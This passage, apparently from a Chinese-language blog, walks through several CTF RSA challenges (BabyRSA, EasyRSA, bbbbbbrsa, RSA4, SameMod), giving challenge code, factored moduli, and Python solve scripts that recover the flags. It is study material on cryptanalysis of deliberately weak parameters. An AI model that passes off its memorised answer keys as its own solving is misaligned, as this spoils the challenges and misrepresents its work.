2019]BabyRSA</h2><p>这一题和下一题同样是需要解方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sympy<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-string">&#x27;GWHT&#123;******&#125;&#x27;</span><br>secret = <span class="hljs-string">&#x27;******&#x27;</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(flag) == <span class="hljs-number">38</span>)<br><br>half = <span class="hljs-built_in">len</span>(flag) / <span class="hljs-number">2</span><br><br>flag1 = flag[:half]<br>flag2 = flag[half:]<br><br>secret_num = getPrime(<span class="hljs-number">1024</span>) * bytes_to_long(secret)<br><br>p = sympy.nextprime(secret_num)<br>q = sympy.nextprime(p)<br><br>N = p * q<br><br>e = <span class="hljs-number">0x10001</span><br><br>F1 = bytes_to_long(flag1)<br>F2 = bytes_to_long(flag2)<br><br>c1 = F1 + F2<br>c2 = <span class="hljs-built_in">pow</span>(F1, <span class="hljs-number">3</span>) + <span class="hljs-built_in">pow</span>(F2, <span class="hljs-number">3</span>)<br><span class="hljs-keyword">assert</span>(c2 &lt; N)<br><br>m1 = <span class="hljs-built_in">pow</span>(c1, e, N)<br>m2 = <span class="hljs-built_in">pow</span>(c2, e, N)<br><br>N=<span class="hljs-number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br>m1=<span class="hljs-number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br>m2=<span class="hljs-number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sympy.abc <span class="hljs-keyword">import</span> x,y<br><span class="hljs-keyword">import</span> libnum<br><br>N=<span class="hljs-number">636585149594574746909030160182690866222909256464847291783000651837227921337237899651287943597773270944384034858925295744880727101606841413640006527614873110651410155893776548737823152943797884729130149758279127430044739254000426610922834573094957082589539445610828279428814524313491262061930512829074466232633130599104490893572093943832740301809630847541592548921200288222432789208650949937638303429456468889100192613859073752923812454212239908948930178355331390933536771065791817643978763045030833712326162883810638120029378337092938662174119747687899484603628344079493556601422498405360731958162719296160584042671057160241284852522913676264596201906163</span><br>m1=<span class="hljs-number">90009974341452243216986938028371257528604943208941176518717463554774967878152694586469377765296113165659498726012712288670458884373971419842750929287658640266219686646956929872115782173093979742958745121671928568709468526098715927189829600497283118051641107305128852697032053368115181216069626606165503465125725204875578701237789292966211824002761481815276666236869005129138862782476859103086726091860497614883282949955023222414333243193268564781621699870412557822404381213804026685831221430728290755597819259339616650158674713248841654338515199405532003173732520457813901170264713085107077001478083341339002069870585378257051150217511755761491021553239</span><br>m2=<span class="hljs-number">487443985757405173426628188375657117604235507936967522993257972108872283698305238454465723214226871414276788912058186197039821242912736742824080627680971802511206914394672159240206910735850651999316100014691067295708138639363203596244693995562780286637116394738250774129759021080197323724805414668042318806010652814405078769738548913675466181551005527065309515364950610137206393257148357659666687091662749848560225453826362271704292692847596339533229088038820532086109421158575841077601268713175097874083536249006018948789413238783922845633494023608865256071962856581229890043896939025613600564283391329331452199062858930374565991634191495137939574539546</span><br><span class="hljs-comment">#N分解为p、q</span><br>p= <span class="hljs-number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377748737</span><br>q= <span class="hljs-number">797862863902421984951231350430312260517773269684958456342860983236184129602390919026048496119757187702076499551310794177917920137646835888862706126924088411570997141257159563952725882214181185531209186972351469946269508511312863779123205322378452194261217016552527754513215520329499967108196968833163329724620251096080377747699</span><br>e = <span class="hljs-number">65537</span><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>c1=<span class="hljs-built_in">pow</span>(m1,d,N)<br>c2=<span class="hljs-built_in">pow</span>(m2,d,N)<br><br><span class="hljs-comment">#解出F1、F2</span><br><span class="hljs-comment"># F=solve([pow(x,3)+pow(y,3)-c2,x+y-c1],[x,y])</span><br><span class="hljs-comment"># print(F)</span><br>F1=<span class="hljs-number">1141553212031156130619789508463772513350070909</span><br>F2=<span class="hljs-number">1590956290598033029862556611630426044507841845</span><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(F2))+libnum.n2s(<span class="hljs-built_in">int</span>(F1)))<br><br></code></pre></td></tr></table></figure><hr><h2 id="2020-BJDCTF-Crypto-EasyRSA"><a href="#2020-BJDCTF-Crypto-EasyRSA" class="headerlink" title="2020-BJDCTF-Crypto-EasyRSA"></a>2020-BJDCTF-Crypto-EasyRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime,bytes_to_long<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> Derivative<br><span class="hljs-keyword">from</span> fractions <span class="hljs-keyword">import</span> Fraction<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>p=getPrime(<span class="hljs-number">1024</span>)<br>q=getPrime(<span class="hljs-number">1024</span>)<br>e=<span class="hljs-number">65537</span><br>n=p*q<br>z=Fraction(<span class="hljs-number">1</span>,Derivative(arctan(p),p))-Fraction(<span class="hljs-number">1</span>,Derivative(arth(q),q))<br>m=bytes_to_long(flag)<br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(c,z,n)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">output:</span><br><span class="hljs-string">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span><br><span class="hljs-string">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span><br><span class="hljs-string">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure><p>Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q))<br>是pow(p,2)+pow(q,2)的意思</p><p>Fraction(a,b) 相当于 a/b<br>Derivative(f(x),x) : 当x=’x’时,求f(x)的导数值<br><a href="https://baike.baidu.com/item/%E5%8F%8D%E5%8F%8C%E6%9B%B2%E5%87%BD%E6%95%B0/7924014?fr=aladdin">arth(q)反双曲线正切函数</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> sympy.abc <span class="hljs-keyword">import</span> p,q<br><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span><br>z=<span class="hljs-number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span><br>n=<span class="hljs-number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span><br><br>PQ=solve([<span class="hljs-built_in">pow</span>(p,<span class="hljs-number">2</span>)+<span class="hljs-built_in">pow</span>(q,<span class="hljs-number">2</span>)-z,p*q-n],[p,q])<br><span class="hljs-built_in">print</span>(PQ)<br><span class="hljs-comment">#得到p，q</span><br>p=<span class="hljs-number">105909195259921349656664570904199242969110902804477734660927330311460997899731622163728968380757294196277263615386525795293086103142131020215128282050307177125962302515483190468569376643751587606016315185736245896434947691528567696271911398179288329609207435393579332931583829355558784305002360873458907029141</span><br>q=<span class="hljs-number">144564833334456076455156647979862690498796694770100520405218930055633597500009574663803955456004439398699669751249623406199542605271188909145969364476344963078599240058180033000440459281558347909876143313940657252737586803051935392596519226965519859474501391969755712097119163926672753588797180811711004203301</span><br><br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><p>调用库解方程方法的使用！！！<br>from sympy import*<br>from sympy.abc import p,q<br>PQ=solve([pow(p,2)+pow(q,2)-z,p*q-n],[p,q]) </p><p>两个参数均为列表，第一个参数为方程列表(将方程右端为0，只将左半部分写入列表)，第二个参数为未知数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#解方程的写法</span><br>c=mpz(<span class="hljs-number">7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035</span>)<br>z=mpz(<span class="hljs-number">32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482</span>)<br>n=mpz(<span class="hljs-number">15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441</span>)<br>e=<span class="hljs-number">65537</span><br>pqplus=iroot(z+<span class="hljs-number">2</span>*n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>pqminus=iroot(z-<span class="hljs-number">2</span>*n,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p=(pqminus+pqplus)//<span class="hljs-number">2</span><br>q=(pqplus-pqminus)//<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure><hr><h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choice<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> isPrime, sieve_base <span class="hljs-keyword">as</span> primes<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getPrime</span>(<span class="hljs-params">bits</span>):</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        n = <span class="hljs-number">2</span><br>        <span class="hljs-keyword">while</span> n.bit_length() &lt; bits:<br>            n *= choice(primes)<br>        <span class="hljs-keyword">if</span> isPrime(n + <span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span> n + <span class="hljs-number">1</span><br><br>e = <span class="hljs-number">0x10001</span><br>m = <span class="hljs-built_in">int</span>.from_bytes(flag.encode(), <span class="hljs-string">&#x27;big&#x27;</span>)<br>p, q = [getPrime(<span class="hljs-number">2048</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>)]<br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br><span class="hljs-comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br><span class="hljs-comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span><br></code></pre></td></tr></table></figure><p>两点需要说明的<br>1、yafu是通过计算来分解N的，而factor网站是通过数据库查询来分解N的<br>这一题的N刚好在数据库中有</p><p>2、 int.from_bytes(bytes, byteorder, *, signed=False)<br>byte转换为int类型函数bytes是要转换的十六进制；<br>byteorder：选’big’和’little’，其中big代表正常顺序，ittle反之<br>signed：选True、Flase表示是否要区分二进制的正负数含义。即是否要对原二进制数进行原码反码 补码操作。</p><hr><h2 id="HDCTF2019-bbbbbbrsa"><a href="#HDCTF2019-bbbbbbrsa" class="headerlink" title="[HDCTF2019]bbbbbbrsa"></a>[HDCTF2019]bbbbbbrsa</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode <span class="hljs-keyword">as</span> b32encode<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert,gcd,iroot<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> a2b_hex,b2a_hex<br><span class="hljs-keyword">import</span> random<br><br>flag = <span class="hljs-string">&quot;******************************&quot;</span><br><br>nbit = <span class="hljs-number">128</span><br><br>p = getPrime(nbit)<br>q = getPrime(nbit)<br>n = p*q<br><br><span class="hljs-built_in">print</span> p<br><span class="hljs-built_in">print</span> n<br><br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><br>e = random.randint(<span class="hljs-number">50000</span>,<span class="hljs-number">70000</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br><span class="hljs-keyword">if</span> gcd(e,phi) == <span class="hljs-number">1</span>:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">else</span>:<br>e -= <span class="hljs-number">1</span>;<br><br>c = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>(b2a_hex(flag),<span class="hljs-number">16</span>),e,n)<br><br><span class="hljs-built_in">print</span> b32encode(<span class="hljs-built_in">str</span>(c))[::-<span class="hljs-number">1</span>]<br><br>c=<span class="hljs-number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span><br>p = <span class="hljs-number">177077389675257695042507998165006460849</span><br>n = <span class="hljs-number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br><br></code></pre></td></tr></table></figure><p>e未知，直接爆破e</p><p><font color=orange><strong>注意all_printable函数的使用</strong></font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">all_printable</span>(<span class="hljs-params">s</span>):</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br><span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x7f</span>):<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>p = <span class="hljs-number">177077389675257695042507998165006460849</span><br>n = <span class="hljs-number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span><br>q=n//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>c = <span class="hljs-number">2373740699529364991763589324200093466206785561836101840381622237225512234632</span><br><span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">70000</span>):<br><span class="hljs-keyword">try</span>:<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>flag=libnum.n2s(<span class="hljs-built_in">int</span>(m))<br><span class="hljs-keyword">if</span> all_printable(flag):<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><hr><h2 id="buu-RSA4"><a href="#buu-RSA4" class="headerlink" title="buu-RSA4"></a>buu-RSA4</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs py">N = <span class="hljs-number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span> <br>c = <span class="hljs-number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span><br><br>N = <span class="hljs-number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span> <br>c = <span class="hljs-number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span><br><br>N = <span class="hljs-number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span> <br>c = <span class="hljs-number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span><br></code></pre></td></tr></table></figure><hr><h2 id="buu-SameMod"><a href="#buu-SameMod" class="headerlink" title="buu-SameMod"></a>buu-SameMod</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,773&#125;<br>&#123;6266565720726907265997241358331585417095726146341989755538017122981360742813498401533594757088796536341941659691259323065631249,839&#125;<br><br><span class="hljs-attribute">message1</span>=3453520592723443935451151545245025864232388871721682326408915024349804062041976702364728660682912396903968193981131553111537349<br><span class="hljs-attribute">message2</span>=5672818026816293344070119332536629619457163570036305296869053532293105379690793386019065754465292867769521736414170803238309535<br><br></code></pre></td></tr></table></figure><p>同模攻击，但是不一样的是m直接转换为字符串是错误的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-number">1021089710312311910410111011910111610410511010710511610511511211111511510598108101125</span><br><br>flag=<span class="hljs-string">&quot;&quot;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(m):<br>    <span class="hljs-keyword">if</span> m[i]==<span class="hljs-string">&#x27;1&#x27;</span>:<br>        c=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(m[i:i+<span class="hljs-number">3</span>]))<br>        i+=<span class="hljs-number">3</span><br>    <span class="hljs-keyword">else</span>:<br>        c=<span class="hljs-built_in">chr</span>(<span 